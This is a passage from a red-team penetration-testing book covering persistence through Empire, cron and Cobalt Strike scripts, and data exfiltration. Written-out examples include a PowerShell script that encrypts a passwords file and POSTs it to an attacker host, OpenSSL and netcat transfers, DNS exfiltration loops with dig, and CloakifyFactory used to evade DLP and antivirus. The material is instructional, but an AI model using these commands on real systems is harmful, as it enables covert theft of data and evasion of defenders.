> ![](media/image752.jpeg)
>
> A login hook tells macOS X to execute a certain script when a user
> logs in. Unlike startup items that open when a user logs in, a login
> hook is a script that executes as root. However, for this module, we
> need to create a script in the victim\'s machine and specify its path
> in this module.
>
> The script also requires the sudo password; we have discussed ways of
> getting this in previous chapters. Once we have it, we enter the data
> in the script and execute it as follows:
>
> ![](media/image753.jpeg)
>
> ![](media/image754.jpeg)Every time a user logs in to the system, we
> will get a new agent connection notification on our Empire interface,
> as shown in the following command:
>
> **For Linux**:
![](media/image755.jpeg)Linux has the crontab module, which can be used.
This creates a cron job that executes our payload at a defined time on
the system:
> ![](media/image756.jpeg)As shown in the following screenshot, we set
> the Hourly option as true. This will execute our payload every hour:
>
> Then, we set the Filename where our payload will be stored and run the
> execute
>
> command, which will set our persistence script as follows:
>
> ![](media/image757.jpeg)
>
> We will then start having agents connect to us from that machine every
> hour.
# Persistence via Cobalt Strike
> In Cobalt Strike, we can achieve persistence with the help of
> Aggressor Scripts. We have already learned about Aggressor Scripts in
> previous chapters.
Some of the Aggressor Scripts are already available on GitHub; we will
use the following one:
> 
>
> ![](media/image758.jpeg)
>
> ![](media/image759.jpeg)Here, we download the scripts on our system
> and import them into our Cobalt Strike client through the script
> manager, as shown in the following screenshot:
In the preceding screenshot, we loaded Persistence_Menu. This script
creates a new entry in the Beacon menu with all the scripts we
downloaded. These scripts can be accessed by right-clicking on the host
\| Red Team \| Persistence, as shown in the following screenshot:
> ![](media/image760.jpeg)
>
> Let\'s look at the following example. Here, we will use HKCU Run
> Registry PowerShell Persistence (User Level).
![](media/image761.jpeg)This script creates a registry keyname for the
payload and another keyname to execute the payload. Clicking on this
option will cause a new window to open where we can specify the name of
both values, as shown in the following screenshot:
Upon clicking Create, a new item will be created in the registry of the
user
> which will contain our base64-encoded PowerShell payload.
>
> For more information about different scripts, visit the following URL:
> [https://git
> hub.com/harleyQu1nn/AggressorScripts/tree/master/Persistence.](https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence)
# Summary
> In this chapter, we learned about achieving persistence using
> Armitage\'s inbuilt exploit modules, then we learned how to do the
> same via Empire on Windows, Linux, and macOS machines. In the last
> section, we learned how to persist sessions in Cobalt Strike with the
> help of Aggressor Scripts.
# Further reading
> For more information on the topics discussed in this chapter, please
> visit the following links:
>
> 
> 
> 
> 
> [https://docs.microsoft.com/en-us/windows/desktop/vss/volume-shadow-copy-service-over
> view](https://docs.microsoft.com/en-us/windows/desktop/vss/volume-shadow-copy-service-overview)
# Data Exfiltration
> Data exfiltration (which can also be referred to as data extrusion or
> data theft) is an unauthorized data transfer from a computer. This can
> either be done by having physical access to the devices in the network
> or by remotely using automated scripts.
>
> **Advanced Persistent Threats** (**APTs**) usually have data
> exfiltration as the main goal. The goal of an APT is to gain access to
> a network but remain undetected as it stealthily seeks out the most
> valuable data.
There may be cases in which the client wants to check both exploitation
as well as data exfiltration. This makes the activity even more
interesting as exfiltration of data without detection can sometimes be
tricky.
> In this chapter, we will cover the following topics:
>
> Exfiltration basics CloakifyFactory
>
> Data exfiltration via DNS Data exfiltration via Empire
# Technical requirements
> Metasploit Framework (MSF) PGSQL (Postgres)
>
> Oracle Java 1.7 or latest Cobalt Strike
>
> Empire Armitage
# Exfiltration basics
> We have already covered some basic techniques in the reverse shell
> chapter. Let\'s do a quick revision of how these techniques can be
> used to transfer data from a victim machine to us.
# Exfiltration via Netcat
> As previously discussed, this is not the best way to transmit data as
> the data is transmitted in plaintext, which makes it easily
> detectable.
>
> ![](media/image762.jpeg)
# Exfiltration via OpenSSL
> We also saw another way to transfer data via OpenSSL using commands,
> as shown by the following, to first generate the certificate and then
> use that certificate to transfer data securely: **openssl req -x509
> -newkey rsa:4096 - keyout key.pem -out cert.pem -days 365 -nodes**
On a server, input the following:
> **openssl s_server -quiet -key key.pem -cert cert.pem -port 8080**
On a client, input the following:
> **openssl s_client -quiet -connect \:\**
>
> ![](media/image763.jpeg)
>
> Transferring data over SSL is secure but it will not always work, as
> we may find systems in the network where OpenSSL is not installed.
# Exfiltration with PowerShell
> Another way to exfiltrate data on Windows systems is by using
> PowerShell. This can be done with a few simple lines of which will
> encrypt the contents of a file
>
> in **Advanced Encryption Standard** (**AES**) format using a
> predefined key and send it to our host using HTTP POST request. A
> simple example of this method can be found at the following link:
> .
>
> Using the following code and saving it as a PowerShell script, or
> executing it directly in the victim\'s command shell, we can
> successfully transfer data.
>
> **\$file = Get-Content C:\\Users\\PT\\Desktop\\passwords.txt**
>
> **\$key = (New-Object
> System.Text.ASCIIEncoding).GetBytes(\"54b8617eca0e54c7d3c8e6732c6b687a**
>
> **\$securestring = new-object System.Security.SecureString foreach
> (\$char in \$file.toCharArray()) {**
>
> **\$secureString.AppendChar(\$char)**
>
> **}**
>
> **\$encryptedData = ConvertFrom-SecureString -SecureString
> \$secureString -Key \$key**
>
> **Invoke-WebRequest -Uri  -Method POST
> -Body \$encryptedData**
The HTTP request will look something like this:
> **POST /exfil HTTP/1.1**
>
> **User-Agent: Mozilla/5.0 (Windows NT; Windows NT 6.3; en-GB)
> WindowsPowerShell/4.0 Content-Type:
> application/x-www-form-urlencoded**
>
> **Host: [www.attacker.host](http://www.attacker.host/) Content-Length:
> 704 Expect: 100-continue Connection: Keep-Alive encrypteddatahere**
To decrypt the code server side, we can use the following code:
> **\$key = (New-Object
> System.Text.ASCIIEncoding).GetBytes(\"54b8617eca0e54c7d3c8e6732c6b687a**
>
> **\$encrypted = \"encrypteddatahere\"**
>
> **echo \$encrypted \| ConvertTo-SecureString -key \$key \|
> ForEach-Object {\[Runtime.InteropSer**
For further reading:
> 
# CloakifyFactory
> CloakifyFactory is developed by Joe Gervais (TryCatchHCF). This was
> presented at DEF CON24. This tool hides the data in plain sight---it
> bypassed **data loss prevention** (**DLP**), whitelisting controls,
> and **antivirus** (**AV**) detection. Blue team members already know
> what to look for when hunting for
>
> traces of attack in the memory or in the network traffic. Cloakify
> defeats them all by transforming any file type into simple strings
> using text-based steganography.
As mentioned by Souvik Roya and P.Venkateswaran in their white paper:
> *\"Steganography is the art of hiding of a message within another so
> that the presence of a hidden message is indistinguishable. The key
> concept behind steganography is that a message to be transmitted is
> not detectable to the casual eye. This is also the advantage of
> steganography over cryptography. An unhidden encrypted message, no
> matter how unbreakable, raises suspicion.*
>
> *There are many steganography methods which use images, video and
> audio as a cover media. Text steganography uses text as a cover media
> for hiding a message. A message can be hidden by shifting a word and
> line in the open spaces in word sequence. The advantage of using text
> steganography over other steganographic techniques is that it has a
> smaller memory requirement and simpler communication.\"*
>
> CloakifyFactory is open source and can be downloaded from GitHub at
> the following link: 
Let\'s familiarize ourselves with the usage of CloakifyFactory. Once the
repository is cloned, we can run the tool using: **python
cloakifyFactory.py**
> ![](media/image764.jpeg)
We will now see the tool running, showing us the options for its usage.
To view the Help for this tool we can type 5 and press *Enter*. This
will display Help and the BASIC USE of the tool as shown as follows:
> ![](media/image765.jpeg)
![](media/image766.jpeg)Let\'s run the tool and *cloak* a file. In this
example, we will cloak the /etc/passwd file of our system. To do this,
we type 1 in the main menu and press *Enter*. We then specify the
filename as cloak and the output file name as shown as follows:
> Next, we choose the ciphers which will be used to hide the data.
> CloakifyFactory has 24 inbuilt ciphers available, including texts in
> different languages, IP addresses, and even emojis.
Ciphers are nothing but a list of unique keywords saved in a file. We
can create our own list and add it as a cipher in the tool (the minimum
number of keywords
> needed when creating a new list is 61). This is extremely useful when
> doing a red team activity because, when we cloak the data and transfer
> it, the data may not be understood by the analysts, but a list of
> emojis transferred across a corporate network through a system may be
> flagged. In such cases, we can make a list of keywords using
> company-relevant data such as internal IPs, system names, employee
> names, internal domain names, and so on. This will decrease the risk
> of being flagged during unencrypted exfiltration.
>
> In our case, for now, we choose belgianBeers as a cipher:
>
> ![](media/image767.jpeg)
>
> Next, we are asked if want to add noise. This tool is not completely
> secure; unlike other cryptography tools it is also vulnerable to
> frequency analysis attacks. We can use the Add Noise option to add
> entropy when cloaking a payload to help degrade frequency analysis
> attacks. Alternatively, for absolute secrecy, we can encrypt the file
> before cloaking.
>
> Setting the options of ciphers is shown as follows:
>
> ![](media/image768.jpeg)
When we preview the cloaked file, it will show a list of beers as shown
as follows:
> ![](media/image769.jpeg)
Let us try getting the original file back from the cloaked one. We run
the tool again, choose option 2, and enter the file name as well as the
output file name as shown as follows:
> ![](media/image770.jpeg)
>
> Next, we choose the cipher we used to cloak the file:
>
> ![](media/image771.jpeg)
>
> By opening the output file, we will see that it\'s the /etc/passwd
> file, which we originally cloaked. We can see that in the screenshot
> as follows:
>
> ![](media/image772.jpeg)
>
> Of course, it is not possible to clone the entire repository on the
> victim\'s machine which is why it has cloakify.py, which is a
> standalone Python file. We can use this with a simple command as
> follows: **python cloakify.py filename ciphername**
>
> In the following screenshot, we can see the /etc/passwd cloaked as
> Hindi words:
>
> ![](media/image773.jpeg)
>
> To decloak this, we have the decloakify option which can be run as
> follows:
## python decloakify.py cloakedfile ciphername
In the following screenshot, we can see the decloaked etc/passwd:
> ![](media/image774.jpeg)
# Running CloakifyFactory on Windows
> Python is not always found on a Windows server, but cloakify.py can be
> compiled to a Windows standalone executable file, which can then be
> uploaded and executed on the system. Let\'s view an example of this
> now.
>
> We browse the files in our Armitage as shown as follows:
>
> ![](media/image775.jpeg)
>
> We select and upload the cloakify.exe and the cipher file on the
> system as follows:
>
> ![](media/image776.jpeg)
>
> When the upload is complete, we browse to the uploaded folder and run
> the EXE as shown as follows:
>
> ![](media/image777.jpeg)
>
> ![](media/image778.jpeg)This output can be saved to a file and
> exfiltrated to our C2 where we can decloakify it to view the contents
> of the file as shown as follows:
# Data exfiltration via DNS
> Data exfiltration can also be done over DNS to avoid detection.
> DNSteal is a great tool for this as it creates a fake DNS server,
> which listens for DNS requests while on the client; we can transfer
> the file data using simple for loops. This supports single as well as
> multiple file transfers.
The tool can be downloaded at the following link:
> 
>
> Once downloaded, the tool can be run using the command shown as
> follows:
>
> ![](media/image779.jpeg)**python dnsteal.py**
>
> This will start the server which will listen on port 53 for incoming
> connections. The tool also gives us a command to be run on \*nix-based
> systems. To exfiltrate
>
> data, we use that command and paste it in the client\'s shell as shown
> as follows:
>
> ![](media/image780.jpeg)
>
> This will send password.txt to our server and we will receive the file
> on our server as shown as follows.
>
> ![](media/image781.jpeg)Once the file transfer has completed, we press
> *Ctrl* + *C*, which will exit the server and save our file:
We can open the file to confirm the contents as follows:
> ![](media/image782.jpeg)
>
> There are other simple commands which we can create to transfer data
> to our server. This includes the following: **for b in \$(xxd -p
> file/to/send); do dig**
## \@serverIP \$b.filename.com; done
> To send multiple files, we can use the command as follows:
>
> **for filename in \$(ls); do for a in \$(xxd -p \$f); do dig
> +short@serverIP %a.\$filename.com**
# Data exfiltration via Empire
> We have already learned about getting reverse shells on Empire and
> using Empire to achieve persistence on the system. The next step is
> data exfiltration.
>
> Empire has a built-in module which allows us to upload the data
> directly on to Dropbox. This is very useful in situations in which IP
> whitelisting is done, as Dropbox is one of the domains that generally